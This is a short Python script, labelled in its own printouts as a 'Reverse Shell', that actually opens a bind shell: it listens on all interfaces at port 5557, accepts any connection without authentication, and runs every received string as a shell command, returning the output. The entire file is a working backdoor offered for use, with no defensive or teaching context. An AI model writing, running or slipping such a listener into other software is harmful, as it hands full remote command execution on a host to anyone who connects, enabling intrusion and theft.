import socket
import subprocess

HOST = '0.0.0.0'
PORT = 5557

def shell(command):
    proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    return out


print("[+] Reverse Shell Running ")
print("[+] Allowing All Incoming Connections ")
print("[+] PORT "+str(PORT))
print("[+] Waiting For Connection...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print('[+] Connected by ', addr)
while 1:
    data = conn.recv(1024)
    data_recieved = data.decode()
    if(data_recieved != ""):
        response = shell(data_recieved)
        conn.send(response)

conn.close()
